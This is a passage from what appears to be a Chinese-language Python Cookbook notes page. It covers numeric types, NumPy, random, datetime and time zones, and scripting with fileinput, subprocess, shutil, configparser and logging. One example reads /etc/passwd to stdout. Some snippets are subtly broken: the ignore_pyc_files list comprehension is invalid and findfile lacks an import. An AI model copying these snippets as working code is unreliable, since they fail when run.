>>> cmath.sqrt(-1) 1j >>> 无穷大与 NaN 创建或测试正无穷、负无穷或 NaN(非数字) 的浮点数 Python 并没有特殊的语法来表示这些特殊的浮点值，但是可以使用 float() 来创 建它们: >>> a = float('inf') >>> b = float('-inf') >>> c = float('nan') >>> a inf >>> b -inf >>> c nan >>> 为了测试这些值的存在，使用 math.isinf() 和 math.isnan() 函数: >>> math.isinf(a) True >>> math.isnan(c) True >>> 有一些地 方需要你特别注意，特别是跟比较和操作符相关的时候。 无穷大数在执行数学计算的时候会传播: >>> a = float('inf') >>> a + 45 inf >>> a * 10 inf >>> 10 / a 0.0 >>> 但是有些操作时未定义的并会返回一个 NaN 结果: >>> a = float('inf') >>> a/a nan >>> b = float('-inf') >>> a + b nan >>> NaN 值会在所有操作中传播，而不会产生异常: >>> c = float('nan') >>> c + 23 nan >>> c / 2 nan >>> c * 2 nan >>> math.sqrt(c) nan >>> NaN 值的一个特别的地方时它们之间的比较操作总是返回 False: >>> c = float('nan') >>> d = float('nan') >>> c == d False >>> c is d False >>> 有时候程序员想改变 Python 默认行为，在返回无穷大或 NaN 结果的操作中抛出 异常。 fpectl 模块可以用来改变这种行为，但是它在标准的 Python 构建中并没有被 启用，它是平台相关的，并且针对的是专家级程序员。 分数运算 /docs/后端/python/python标准库/fractions 模块可以被用来执行包含分数的数学运算: >>> from fractions import Fraction >>> a = Fraction(5, 4) >>> b = Fraction(7, 16) >>> print(a + b) 27/16 >>> print(a * b) 35/64 >>> # Getting numerator/denominator >>> c = a * b >>> c.numerator 35 >>> c.denominator 64 >>> # Converting to a float >>> float(c) 0.546875 >>> # Limiting the denominator of a value >>> print(c.limit_denominator(8)) 4/7 >>> # Converting a float to a fraction >>> x = 3.75 >>> y = Fraction(*x.as_integer_ratio()) >>> y Fraction(15, 4) >>> 大型数组运算 使用 /docs/后端/python/python三方库/numpy .: >>> # Python lists >>> x = [1, 2, 3, 4] >>> y = [5, 6, 7, 8] >>> x * 2 [1, 2, 3, 4, 1, 2, 3, 4] >>> x + 10 Traceback (most recent call last): File \"<stdin>\", line 1, in <module> TypeError: can only concatenate list (not \"int\") to list >>> x + y [1, 2, 3, 4, 5, 6, 7, 8] >>> # Numpy arrays >>> import numpy as np >>> ax = np.array([1, 2, 3, 4]) >>> ay = np.array([5, 6, 7, 8]) >>> ax * 2 array([2, 4, 6, 8]) >>> ax + 10 array([11, 12, 13, 14]) >>> ax + ay array([ 6, 8, 10, 12]) >>> ax * ay array([ 5, 12, 21, 32]) >>> NumPy 中的标 量运算 (比如 ax * 2 或 ax + 10 ) 会作用在每一个元素上. 另外，当两个操作数都是 数组的时候执行元素对等位置计算，并最终生成一个新的数组. NumPy 还为数组操作提供了大量的通用函数，这些函数可以作为 math 模块中类似 函数的替代: >>> np.sqrt(ax) array([ 1. , 1.41421356, 1.73205081, 2. ]) >>> np.cos(ax) array([ 0.54030231, -0.41614684, -0.9899925 , -0.65364362]) >>> 底层实现中，NumPy 数组使用了 C 或者 Fortran 语言的机制分配内存。也就是说， 它们是一个非常大的连续的并由同类型数据组成的内存区域。 所以，你可以构造一个比 普通 Python 列表大的多的数组。比如，如果你想构造一个 10,000*10,000 的浮点数二 维网格，很轻松: >>> grid = np.zeros(shape=(10000,10000), dtype=float) 它扩展 Python 列表的索引功能 - 特别 是对于多维数组: >>> a = np.array([[1, 2, 3, 4], [5, 6, 7, 8], [9, 10, 11, 12]]) >>> a array([[ 1, 2, 3, 4], [ 5, 6, 7, 8], [ 9, 10, 11, 12]]) >>> # Select row 1 >>> a[1] array([5, 6, 7, 8]) >>> # Select column 1 >>> a[:,1] array([ 2, 6, 10]) 矩阵与线性代数运算 执行矩阵和线性代数运算，比如矩阵乘法、寻找行列式、求解线性方程组等 等 NumPy 库( /docs/后端/python/python三方库/numpy )有一个矩阵对象可以用来解决这个问题: >>> import numpy as np >>> m = np.matrix([[1,-2,3],[0,4,5],[7,8,-9]]) >>> m matrix([[ 1, -2, 3], [ 0, 4, 5], [ 7, 8, -9]]) >>> # Return transpose >>> m.T matrix([[ 1, 0, 7], [-2, 4, 8], [ 3, 5, -9]]) >>> # Return inverse >>> m.I matrix([[ 0.33043478, -0.02608696, 0.09565217], [-0.15217391, 0.13043478, 0.02173913], [ 0.12173913, 0.09565217, -0.0173913 ]]) >>> # Create a vector and multiply >>> v = np.matrix([[2],[3],[4]]) >>> v matrix([[2], [3], [4]]) >>> m * v matrix([[ 8], [32], [ 2]]) >>> 可以在 numpy.linalg 子包中找到更多的操作函数: >>> import numpy.linalg >>> # Determinant >>> numpy.linalg.det(m) -229.99999999999983 >>> # Eigenvalues >>> numpy.linalg.eigvals(m) array([-13.11474312, 2.75956154, 6.35518158]) >>> # Solve for x in mx = v >>> x = numpy.linalg.solve(m, v) >>> x matrix([[ 0.96521739], [ 0.17391304], [ 0.46086957]]) >>> m * x matrix([[ 2.], [ 3.], [ 4.]]) >>> v matrix([[2], [3], [4]]) >>> 随机选择 从一个序列中随机抽取若干元素，或者想生成几个随机数 random 模块有大量的函数用来产生随机数和随机选择元素。 比如，要想从一个序 列中随机的抽取一个元素，可以使用 random.choice: >>> import random >>> values = [1, 2, 3, 4, 5, 6] >>> random.choice(values) 2 >>> random.choice(values) 3 为了提取出 N 个不同元素的样本用来做进一步的操作，可以使用 random.sample >>> random.sample(values, 2) [6, 2] >>> random.sample(values, 2) [4, 3] >>> random.sample(values, 3) [4, 3, 1] >>> random.sample(values, 3) [5, 4, 1] >>> 仅仅只是想打乱序列中元素的顺序，可以使用 random.shuffle >>> random.shuffle(values) >>> values [2, 4, 6, 5, 3, 1] >>> random.shuffle(values) >>> values [3, 5, 2, 1, 6, 4] >>> 生成随机整数，请使用 random.randint >>> random.randint(0,10) 2 >>> random.randint(0,10) 5 >>> random.randint(0,10) 0 >>> random.randint(0,10) 7 >>> random.randint(0,10) 10 >>> random.randint(0,10) 3 >>> 为了生成 0 到 1 范围内均匀分布的浮点数，使用 random.random >>> random.random() 0.9406677561675867 >>> random.random() 0.133129581343897 >>> random.random() 0.4144991136919316 >>> 获取 N 位随机位 (二进制) 的整数，使用 random.getrandbits >>> random.getrandbits(200) 335837000776573622800628485064121869519521710558559406913275 >>> andom 模块使用 Mersenne Twister 算法来计算生成随机数。 这是一个确定性算 法，但是你可以通过 random.seed() 函数修改初始化种子: random.seed() # Seed based on system time or os.urandom() random.seed(12345) # Seed based on integer given random.seed(b'bytedata') # Seed based on byte data random 模块还包含基于均匀分布、高斯分布和其他分布的 随机数生成函数。 比如，random.uniform() 计算均匀分布随机数，random.gauss() 计算正态分布随机数。 对于其他的分布情况请参考在线文档。 在 random 模块中的函数不应该用在和密码学相关的程序中。 如果你确实需要类似 的功能，可以使用 ssl 模块中相应的函数。 比如，ssl.RAND_bytes() 可以用来生成一 个安全的随机字节序列。 基本的日期与时间转换 执行简单的时间转换，比如天到秒，小时到分钟等的转换 为了执行不同时间单位的转换和计算，请使用 datetime 模块。比如，为了表示一 个时间段，可以创建一个 timedelta 实例: >>> from datetime import timedelta >>> a = timedelta(days=2, hours=6) >>> b = timedelta(hours=4.5) >>> c = a + b >>> c.days 2 >>> c.seconds 37800 >>> c.seconds / 3600 10.5 >>> c.total_seconds() / 3600 58.5 >>> 如果你想表示指定的日期和时间，先创建一个 datetime 实例然后使用标准的数学 运算来操作它们: >>> from datetime import datetime >>> a = datetime(2012, 9, 23) >>> print(a + timedelta(days=10)) 2012-10-03 00:00:00 >>> >>> b = datetime(2012, 12, 21) >>> d = b - a >>> d.days 89 >>> now = datetime.today() >>> print(now) 2012-12-21 14:54:43.094063 >>> print(now + timedelta(minutes=10)) 2012-12-21 15:04:43.094063 >>> 计算的时候，需要注意的是 datetime 会自动处理闰年: >>> a = datetime(2012, 3, 1) >>> b = datetime(2012, 2, 28) >>> a - b datetime.timedelta(2) >>> (a - b).days 2 >>> c = datetime(2013, 3, 1) >>> d = datetime(2013, 2, 28) >>> (c - d).days 1 >>> 对大多数基本的日期和时间处理问题，datetime 模块已经足够了。 如果你需要执 行更加复杂的日期操作，比如处理时区，模糊时间范围，节假日计算等等，可以考虑使 用 dateutil 模块 许多类似的时间计算可以使用 dateutil.relativedelta() 函数代替。 但是，有一 点需要注意的就是，它会在处理月份 (还有它们的天数差距) 的时候填充间隙 , 即有些月有30天, 有些有31天: >>> a = datetime(2012, 9, 23) >>> a + timedelta(months=1) Traceback (most recent call last): File \"<stdin>\", line 1, in <module> TypeError: 'months' is an invalid keyword argument for this function >>> >>> from dateutil.relativedelta import relativedelta >>> a + relativedelta(months=+1) datetime.datetime(2012, 10, 23, 0, 0) >>> a + relativedelta(months=+4) datetime.datetime(2013, 1, 23, 0, 0) >>> >>> # Time between two dates >>> b = datetime(2012, 12, 21) >>> d = b - a >>> d datetime.timedelta(89) >>> d = relativedelta(b, a) >>> d relativedelta(months=+2, days=+28) >>> d.months 2 >>> d.days 28 >>> 计算最后一个周五的日期 需要查找星期中某一天最后出现的日期，比如星期五 计算当前月份的日期范围 在当前月份中循环每一天，想找到一个计算这个日期范围的高效方 法。 在这样的日期上循环并需要事先构造一个包含所有日期的列表。 你可以先计算出 开始日期和结束日期，然后在你步进的时候使用 datetime.timedelta 对象递增这个日 期变量即可。 下面是一个接受任意 datetime 对象并返回一个由当前月份开始日和下个月开始日 组成的元组对象: from datetime import datetime, date, timedelta import calendar def get_month_range(start_date=None): if start_date is None: start_date = date.today().replace(day=1) _, days_in_month = calendar.monthrange(start_date.year, start_date.month) end_date = start_date + timedelta(days=days_in_month) return (start_date, end_date) 字符串转换为日期 应用程序接受字符串格式的输入，但是你想将它们转换为 datetime 对象以便 在上面执行非字符串操作。 使用 Python 的标准模块 datetime 可以很容易的解决这个问题。比如: >>> from datetime import datetime >>> text = '2012-09-20' >>> y = datetime.strptime(text, '%Y-%m-%d') >>> z = datetime.now() >>> diff = z - y >>> diff datetime.timedelta(3, 77824, 177393) >>> datetime.strptime() 方法支持很多的格式化代码，比如 %Y 代表 4 位数年份，%m 代表两位数月份。 还有一点值得注意的是这些格式化占位符也可以反过来使用，将日期 输出为指定的格式字符串形式。 strptime() 的性能要比你想象中的差很多，因为它是使 用纯 Python 实现，并且必须处理所有的系统本地设置。 如果你要在代码中需要解析大 量的日期并且已经知道了日期字符串的确切格式，可以自己实现一套解析方案来获取 更好的性能。 比如，如果你已经知道所以日期格式是 YYYY-MM-DD ，你可以像下面这样 实现一个解析函数: from datetime import datetime def parse_ymd(s): year_s, mon_s, day_s = s.split('-') return datetime(int(year_s), int(mon_s), int(day_s)) 结合时区的日期操作 你有一个安排在 2012 年 12 月 21 日早上 9:30 的电话会议，地点在芝加哥。 而你 的朋友在印度的班加罗尔，那么他应该在当地时间几点参加这个会议呢? 对几乎所有涉及到时区的问题，你都应该使用 pytz 模块。 这个包提供了 Olson 时 区数据库，它是时区信息的事实上的标准，在很多语言和操作系统里面都可以找到。 pytz 模块一个主要用途是将 datetime 库创建的简单日期对象本地化。比如，下 面如何表示一个芝加哥时间的示例: >>> from datetime import datetime >>> from pytz import timezone >>> d = datetime(2012, 12, 21, 9, 30, 0) >>> print(d) 2012-12-21 09:30:00 >>> >>> # Localize the date for Chicago >>> central = timezone('US/Central') >>> loc_d = central.localize(d) >>> print(loc_d) 2012-12-21 09:30:00-06:00 >>> 如果你打算在本地化日期上执行计算，你需要特别注意夏令时转换和其他细节。 比 如，在 2013 年，美国标准夏令时时间开始于本地时间 3 月 13 日凌晨 2:00(在那时，时 间向前跳过一小时)。 如果你正在执行本地计算，你会得到一个错误。比如: >>> d = datetime(2013, 3, 10, 1, 45) >>> loc_d = central.localize(d) >>> print(loc_d) 2013-03-10 01:45:00-06:00 >>> later = loc_d + timedelta(minutes=30) >>> print(later) 2013-03-10 02:15:00-06:00 # WRONG! WRONG! >>> 结果错误是因为它并没有考虑在本地时间中有一小时的跳跃。为了修正这个错误， 可以使用时区对象 normalize() 方法。比如: >>> from datetime import timedelta >>> later = central.normalize(loc_d + timedelta(minutes=30)) >>> print(later) 2013-03-10 03:15:00-05:00 >>> 为了不让你被这些东东弄的晕头转向，处理本地化日期的通常的策略先将所有日 期转换为 UTC 时间，并用它来执行所有的中间存储和操作: >>> print(loc_d) 2013-03-10 01:45:00-06:00 >>> utc_d = loc_d.astimezone(pytz.utc) >>> print(utc_d) 2013-03-10 07:45:00+00:00 >>> 一旦转换为 UTC，你就不用去担心跟夏令时相关的问题了。 因此，你可以跟之前 一样放心的执行常见的日期计算。 当你想将输出变为本地时间的时候，使用合适的时区 去转换下就行了。比如: >>> later_utc = utc_d + timedelta(minutes=30) >>> print(later_utc.astimezone(central)) 2013-03-10 03:15:00-05:00 >>> 得到时区名, 使用 ISO 3166 国家代码作为关键字去查阅字典 pytz.country_timezones: >>> pytz.country_timezones['IN'] ['Asia/Kolkata'] >>>","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-cookbook-Number,-date,-time.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-Number,-date,-time.html"},{"title":"脚本编程与系统管理","text":"许多人使用 Python 作为一个 shell 脚本的替代，用来实现常用系统任务的自动化， 如文件的操作，系统的配置等。本章的主要目标是描述关于编写脚本时候经常遇到的一 些功能。例如，解析命令行选项、获取有用的系统配置数据等等。第 5 章也包含了与文 件和目录相关的一般信息。 通过重定向/管道/文件接受输入 问题 你希望你的脚本接受任何用户认为最简单的输入方式。包括将命令行的输出通过 管道传递给该脚本、重定向文件到该脚本，或在命令行中传递一个文件名或文件名列表 给该脚本。 解决方案 Python 内置的 fileinput 模块让这个变得简单。如果你有一个下面这样的脚本: #!/usr/bin/env python3 import fileinput with fileinput.input() as f_input: for line in f_input: print(line, end='') 作用就是将文件名传递给Python脚本让其输出文件内容 那么你就能以前面提到的所有方式来为此脚本提供输入。假设你将此脚本保存为 filein.py 并将其变为可执行文件，那么你可以像下面这样调用它，得到期望的输出: $ ls | ./filein.py # Prints a directory listing to stdout. $ ./filein.py /etc/passwd # Reads /etc/passwd to stdout. $ ./filein.py < /etc/passwd # Reads /etc/passwd to stdout. 讨论 fileinput.input() 创建并返回一个 FileInput 类的实例。该实例除了拥有一些 有用的帮助方法外，它还可被当做一个上下文管理器使用。因此，整合起来，如果我们 要写一个打印多个文件输出的脚本，那么我们需要在输出中包含文件名和行号，如下所 示: >>> import fileinput >>> with fileinput.input('/etc/passwd') as f: >>> for line in f: ... print(f.filename(), f.lineno(), line, end='') ... /etc/passwd 1 ## /etc/passwd 2 # User Database /etc/passwd 3 # <other output omitted> 通过将它作为一个上下文管理器使用，可以确保它不再使用时文件能自动关闭，而 且我们在之后还演示了 FileInput 的一些有用的帮助方法来获取输出中的一些其他信 息。 终止程序并给出错误信息 问题 你想向标准错误打印一条消息并返回某个非零状态码来终止程序运行 解决方案 你有一个程序像下面这样终止，抛出一个 SystemExit 异常，使用错误消息作为参 数。例如: raise SystemExit('It failed!') 它会将消息在 sys.stderr 中打印，然后程序以状态码 1 退出。 解析命令行选项 问题 你的程序如何能够解析命令行选项（位于 sys.argv 中） 解决方案 argparse 模块可被用来解析命令行选项: import argparse parser = argparse.ArgumentParser(description='Search some files') parser.add_argument(dest='filenames',metavar='filename', nargs='*') parser.add_argument('-p', '--pat',metavar='pattern', required=True, dest='patterns', action='append', help='text pattern to search for') 讨论 argparse 模块是标准库中最大的模块之一，拥有大量的配置选项。 为 了 解 析 命 令 行 选 项， 你 首 先 要 创 建 一 个 ArgumentParser 实 例，并 使 用 add_argument() 方法声明你想要支持的选项。在每个 add_argument() 调用中，dest 参数指定解析结果被指派给属性的名字。metavar 参数被用来生成帮助信息。action 参数指定跟属性对应的处理逻辑，通常的值为 store , 被用来存储某个值或讲多个参数 值收集到一个列表中。下面的参数收集所有剩余的命令行参数到一个列表中。在本例中 它被用来构造一个文件名列表: parser.add_argument(dest='filenames',metavar='filename', nargs='*') 注解 Python3 有一个click模块可以通过装饰器来使用, 更方便. 运行时弹出密码输入提示 问题 你写了个脚本，运行时需要一个密码。此脚本是交互式的，因此不能将密码在脚本 中硬编码，而是需要弹出一个密码输入提示，让用户自己输入 解决方案 这时候 Python 的 getpass 模块正是你所需要的。你可以让你很轻松的弹出密码 输入提示，并且不会在用户终端回显密码。下面是具体代码: import getpass user = getpass.getuser() passwd = getpass.getpass() if svc_login(user, passwd): # You must write svc_login() print('Yay!') else: print('Boo!') 在此代码中，svc_login() 是你要实现的处理密码的函数，具体的处理过程你自己 决定。 讨论 注意在前面代码中 getpass.getuser() 不会弹出用户名的输入提示。它会根据该 用户的 shell 环境或者会依据本地系统的密码库（支持 pwd 模块的平台）来使用当前用 户的登录名， 如果你想显示的弹出用户名输入提示，使用内置的 input 函数: user = input('Enter your username: ') 还有一点很重要，有些系统可能不支持 getpass() 方法隐藏输入密码。这种情况 下，Python 会提前警告你这些问题（例如它会警告你说密码会以明文形式显示） 获取终端的大小 问题 你需要知道当前终端的大小以便正确的格式化输出。 解决方案 使用 os.get_terminal_size() 函数来做到这一点: >>> import os >>> sz = os.get_terminal_size() >>> sz os.terminal_size(columns=80, lines=24) >>> sz.columns 80 >>> sz.lines 24 >>> 讨论 有太多方式来得知终端大小了，从读取环境变量到执行底层的 ioctl() 函数等等。 不过，为什么要去研究这些复杂的办法而不是仅仅调用一个简单的函数呢？ 执行外部命令并获取它的输出 问题 你想执行一个外部命令并以 Python 字符串的形式获取执行结果。 解决方案 使用 subprocess.check_output() 函数。例如: import subprocess out_bytes = subprocess.check_output(['netstat','-a']) 这段代码执行一个指定的命令并将执行结果以一个字节字符串的形式返回。如果 你需要文本形式返回，加一个解码步骤即可。例如: out_text = out_bytes.decode('utf-8') 如果被执行的命令以非零码返回，就会抛出异常。下面的例子捕获到错误并获取返 回码: try: out_bytes = subprocess.check_output(['cmd','arg1','arg2']) except subprocess.CalledProcessError as e: out_bytes = e.output # Output generated before error code = e.returncode # Return code 默认情况下，check_output() 仅仅返回输入到标准输出的值。如果你需要同时收 集标准输出和错误输出，使用 stderr 参数: out_bytes = subprocess.check_output(['cmd','arg1','arg2'], stderr=subprocess.STDOUT) 如果你需要用一个超时机制来执行命令，使用 timeout 参数: try: out_bytes = subprocess.check_output(['cmd','arg1','arg2'], timeout=5) except subprocess.TimeoutExpired as e: ... 通常来讲，命令的执行不需要使用到底层 shell 环境（比如 sh、bash）。一个字符串 列表会被传递给一个低级系统命令，比如 os.execve() 。如果你想让命令被一个 shell 执行，传递一个字符串参数，并设置参数 shell=True . 有时候你想要 Python 去执行 一个复杂的 shell 命令的时候这个就很有用了，比如管道流、I/O 重定向和其他特性。 例如: out_bytes = subprocess.check_output('grep python | wc > out', shell=True) 需要注意的是在 shell 中执行命令会存在一定的安全风险，特别是当参数来自于用 户输入时。这时候可以使用 shlex.quote() 函数来将参数正确的用双引用引起来。 讨论 使用 check_output() 函数是执行外部命令并获取其返回值的最简单方式。但是， 如果你需要对子进程做更复杂的交互，比如给它发送输入，你得采用另外一种方法。这 时候可直接使用 subprocess.Popen 类: import subprocess # Some text to send text = b''' hello world this is a test goodbye ''' # Launch a command with pipes p = subprocess.Popen(['wc'], stdout = subprocess.PIPE, stdin = subprocess.PIPE) # Send the data and get the output stdout, stderr = p.communicate(text) # To interpret as text, decode out = stdout.decode('utf-8') err = stderr.decode('utf-8') subprocess 模块对于依赖 TTY 的外部命令不合适用。例如，你不能使用它来自 动化一个用户输入密码的任务（比如一个 ssh 会话）。这时候，你需要使用到第三方模 块了，比如基于著名的 expect 家族的工具（pexpect 或类似的） 复制或者移动文件和目录 问题 你想要复制或移动文件和目录，但是又不想调用 shell 命令。 解决方案 shutil 模块有很多便捷的函数可以复制文件和目录。使用起来非常简单: import shutil # Copy src to dst. (cp src dst) shutil.copy(src, dst) # Copy files, but preserve metadata (cp -p src dst) shutil.copy2(src, dst) # Copy directory tree (cp -R src dst) shutil.copytree(src, dst) # Move src to dst (mv src dst) shutil.move(src, dst) 这些函数的参数都是字符串形式的文件或目录名。底层语义模拟了类似的 Unix 命 令，如上面的注释部分。 默认情况下，对于符号链接而已这些命令处理的是它指向的东西。例如，如果源文 件是一个符号链接，那么目标文件将会是符号链接指向的文件。如果你只想复制符号链 接本身，那么需要指定关键字参数 follow_symlinks , 如下： 如果你想保留被复制目录中的符号链接，像这样做: shutil.copytree(src, dst, symlinks=True) copytree() 可以让你在复制过程中选择性的忽略某些文件或目录。你可以提供一 个忽略函数，接受一个目录名和文件名列表作为输入，返回一个忽略的名称列表。例如: def ignore_pyc_files(dirname, filenames): return [name in filenames if name.endswith('.pyc')] shutil.copytree(src, dst, ignore=ignore_pyc_files) 由于忽略某种模式的文件名是很常见的，因此一个便捷的函数 ignore_patterns() 已经包含在里面了。例如: shutil.copytree(src, dst, ignore=shutil.ignore_patterns('*~', '*.pyc')) 讨论 对于文件元数据信息，copy2() 这样的函数只能尽自己最大能力来保留它。访问时间、创建时间和权限这些基本信息 会被保留，但是对于所有者、ACLs、资源 fork 和其他更深层次的文件元信息就说不准 了，这个还得依赖于底层操作系统类型和用户所拥有的访问权限。你通常不会去使用 shutil.copytree() 函数来执行系统备份。 使用 copytree() 复制文件夹的一个棘手的问题是对于错误的处理。例如，在复制 过程中，函数可能会碰到损坏的符号链接，因为权限无法访问文件的问题等等。为了解 决这个问题，所有碰到的问题会被收集到一个列表中并打包为一个单独的异常，到了最 后再抛出。下面是一个例子: try: shutil.copytree(src, dst) except shutil.Error as e: for src, dst, msg in e.args[0]: # src is source name # dst is destination name # msg is error message from exception print(dst, src, msg) 如果你提供关键字参数 ignore_dangling_symlinks=True ，这时候 copytree() 会忽略掉无效符号链接。 本节演示的这些函数都是最常见的。不过，shutil 还有更多的和复制数据相关的 操作。它的文档很值得一看，参考: https://docs.python.org/3/library/shutil.html 创建和解压归档文件 问题 你需要创建或解压常见格式的归档文件（比如.tar, .tgz 或.zip） 解决方案 shutil 模块拥有两个函数——make_archive() 和 unpack_archive() 可派上用 场: >>> import shutil >>> shutil.unpack_archive('Python-3.3.0.tgz') >>> shutil.make_archive('py33','zip','Python-3.3.0') '/Users/beazley/Downloads/py33.zip' >>> make_archive() 的 第 二 个 参 数 是 期 望 的 输 出 格 式。可 以 使 用 get_archive_formats() 获取所有支持的归档格式列表。例如: >>> shutil.get_archive_formats() [('bztar', \"bzip2'ed tar-file\"), ('gztar', \"gzip'ed tar-file\"), ('tar', 'uncompressed tar file'), ('zip', 'ZIP file')] >>> 讨论 Python 还有其他的模块可用来处理多种归档格式（比如 tarfile, zipfile, gzip, bz2） 的底层细节。不过，如果你仅仅只是要创建或提取某个归档，就没有必要使用底层库 了。可以直接使用 shutil 中的这些高层函数。 这些函数还有很多其他选项，用于日志打印、预检、文件权限等等。 通过文件名查找文件 问题 你需要写一个涉及到文件查找操作的脚本，比如对日志归档文件的重命名工具，你 不想在 Python 脚本中调用 shell，或者你要实现一些 shell 不能做的功能。 解决方案 查找文件，可使用 os.walk() 函数，传一个顶级目录名给它。下面是一个例子，查 找特定的文件名并答应所有符合条件的文件全路径： #!/usr/bin/env python3.3 import os def findfile(start, name): for relpath, dirs, files in os.walk(start): if name in files: full_path = os.path.join(start, relpath, name) print(os.path.normpath(os.path.abspath(full_path))) if __name__ == '__main__': findfile(sys.argv[1], sys.argv[2]) findfile参数为初始查找目录与查找文件名 讨论 os.walk() 方法为我们遍历目录树，每次进入一个目录，它会返回一个三元组，包 含相对于查找目录的相对路径，一个该目录下的目录名列表，以及那个目录下面的文件 名列表。 对于每个元组，只需检测一下目标文件名是否在文件列表中。如果是就使用 os. path.join() 合并路径。为了避免奇怪的路径名比如 ././foo//bar ，使用了另外两个 函数来修正结果。第一个是 os.path.abspath() , 它接受一个路径，可能是相对路径， 最后返回绝对路径。第二个是 os.path.normpath() ，用来返回正常路径，可以解决双 斜杆、对目录的多重引用的问题等。 尽管这个脚本相对于 UNIX 平台上面的很多查找来讲要简单很多，它还有跨平台 的优势。并且，还能很轻松的加入其他的功能。 读取配置文件 问题 怎样读取普通.ini 格式的配置文件？ 解决方案 configparser 模块能被用来读取配置文件。例如，假设你有如下的配置文件: ; config.ini ; Sample configuration file [installation] library=%(prefix)s/lib include=%(prefix)s/include bin=%(prefix)s/bin prefix=/usr/local # Setting related to debug configuration [debug] log_errors=true show_warnings=False [server] port: 8080 nworkers: 32 pid-file=/tmp/spam.pid root=/www/root signature: ================================= Brought to you by the Python Cookbook ================================= 下面是一个读取和提取其中值的例子: >>> from configparser import ConfigParser >>> cfg = ConfigParser() >>> cfg.read('config.ini') ['config.ini'] >>> cfg.sections() ['installation', 'debug', 'server'] >>> cfg.get('installation','library') '/usr/local/lib' >>> cfg.getboolean('debug','log_errors') True >>> cfg.getint('server','port') 8080 >>> cfg.getint('server','nworkers') 32 >>> print(cfg.get('server','signature')) \\================================= Brought to you by the Python Cookbook \\================================= >>> 如果有需要，你还能修改配置并使用 cfg.write() 方法将其写回到文件中。例如: >>> cfg.set('server','port','9000') >>> cfg.set('debug','log_errors','False') >>> import sys >>> cfg.write(sys.stdout) 讨论 配置文件作为一种可读性很好的格式，非常适用于存储程序中的配置数据。在每个 配置文件中，配置数据会被分组（比如例子中的\"installation\"、\"debug\"和\"server\"）。 每个分组在其中指定对应的各个变量值。 对于可实现同样功能的配置文件和 Python 源文件是有很大的不同的。首先，配置 文件的语法要更自由些，下面的赋值语句是等效的: prefix=/usr/local prefix: /usr/local 配置文件中的名字是不区分大小写的。例如: >>> cfg.get('installation','PREFIX') '/usr/local' >>> cfg.get('installation','prefix') '/usr/local' >>> 在解析值的时候，getboolean() 方法查找任何可行的值。例如下面都是等价的: log_errors = true log_errors = TRUE log_errors = Yes log_errors = 1 或许配置文件和 Python 代码最大的不同在于，它并不是从上而下的顺序执行。文 件是安装一个整体被读取的。如果碰到了变量替换，它实际上已经被替换完成了。例 如，在下面这个配置中，prefix 变量在使用它的变量之前或之后定义都是可以的: [installation] library=%(prefix)s/lib include=%(prefix)s/include bin=%(prefix)s/bin prefix=/usr/local ConfigParser 有个容易被忽视的特性是它能一次读取多个配置文件然后合并成一 个配置。例如，假设一个用户像下面这样构造了他们的配置文件: ; ~/.config.ini [installation] prefix=/Users/beazley/test [debug] log_errors=False 读取这个文件，它就能跟之前的配置合并起来。如: >>> # Previously read configuration >>> cfg.get('installation', 'prefix') '/usr/local' >>> # Merge in user-specific configuration >>> import os >>> cfg.read(os.path.expanduser('~/.config.ini')) ['/Users/beazley/.config.ini'] >>> cfg.get('installation', 'prefix') '/Users/beazley/test' >>> cfg.get('installation', 'library') '/Users/beazley/test/lib' >>> cfg.getboolean('debug', 'log_errors') False >>> 仔细观察下 prefix 变量是怎样覆盖其他相关变量的，比如 library 的设定值。产 生这种结果的原因是变量的改写采取的是后发制人策略，以最后一个为准。 最后还有很重要一点要注意的是 Python 并不能支持.ini 文件在其他程序（比如 windows 应用程序）中的所有特性。 给简单脚本增加日志功能 问题 你希望在脚本和程序中将诊断信息写入日志文件。 解决方案 打印日志最简单方式是使用 logging 模块。 代码中编码可以使用basicConfig, 也可以使用ini配置文件, 如: logging.config.fileConfig('logconfig.ini') logconfig.ini内容: [loggers] keys=root [handlers] keys=defaultHandler [formatters] keys=defaultFormatter [logger_root] level=INFO handlers=defaultHandler qualname=root [handler_defaultHandler] class=FileHandler formatter=defaultFormatter args=('app.log', 'a') [formatter_defaultFormatter] format=%(levelname)s:%(name)s:%(message)s 如果你想修改配置，可以直接编辑文件 logconfig.ini 即可。 讨论 尽管对于 logging 模块而已有很多更高级的配置选项，不过这里的方案对于简单 的程序和脚本已经足够了。只想在调用日志操作前先执行下 basicConfig() 函数方法，你 的程序就能产生日志输出了。 如 果 你 想 要 你 的 日 志 消 息 写 到 标 准 错 误 中， 而 不 是 日 志 文 件 中， 调 用 basicConfig() 时不传文件名参数即可。例如: logging.basicConfig(level=logging.INFO) basicConfig() 在程序中只能被执行一次。如果你稍后想改变日志配置，就需要先 获取 root logger ，然后直接修改它。 给函数库增加日志功能 问题 你想给某个函数库增加日志功能，但是又不能影响到那些不使用日志功能的程序。 解决方案 对于想要执行日志操作的函数库而已，你应该创建一个专属的 logger 对象，并且 像下面这样初始化配置: # somelib.py import logging log = logging.getLogger(__name__) log.addHandler(logging.NullHandler()) # Example function (for testing) def func(): log.critical('A Critical Error!') log.debug('A debug message') 使用这个配置，默认情况下不会打印日志。 不过，如果配置过日志系统，那么日志消息打印就开始生效，例如: >>> import logging >>> logging.basicConfig() >>> somelib.func() CRITICAL:somelib:A Critical Error! >>> 讨论 通常来讲，你不应该在函数库代码中自己配置日志系统，或者是已经假定有个已经 存在的日志配置了。 调用 getLogger(__name__) 创建一个和调用模块同名的 logger 模块。由于模块都 是唯一的，因此创建的 logger 也将是唯一的。 log.addHandler(logging.NullHandler()) 操作将一个空处理器绑定到刚刚已经 创建好的 logger 对象上。一个空处理器默认会忽略调用所有的日志消息。因此，如果使 用该函数库的时候还没有配置日志，那么将不会有消息或警告出现。 还有一点就是对于各个函数库的日志配置可以是相互独立的，不影响其他库的日 志配置。 实现一个计时器 问题 你想记录程序执行多个任务所花费的时间 解决方案 time 模块包含很多函数来执行跟时间有关的函数。尽管如此，通常我们会在此基 础之上构造一个更高级的接口来模拟一个计时器 限制内存和 CPU 的使用量 问题 你想对在 Unix 系统上面运行的程序设置内存或 CPU 的使用限制。 解决方案 resource 模块能同时执行这两个任务。例如，要限制 CPU 时间，可以像下面这样 做: import signal import resource import os def time_exceeded(signo, frame): print(\"Time's up!\") raise SystemExit(1) def set_max_runtime(seconds): # Install the signal handler and set a resource limit soft, hard = resource.getrlimit(resource.RLIMIT_CPU) resource.setrlimit(resource.RLIMIT_CPU, (seconds, hard)) signal.signal(signal.SIGXCPU, time_exceeded) if __name__ == '__main__': set_max_runtime(15) 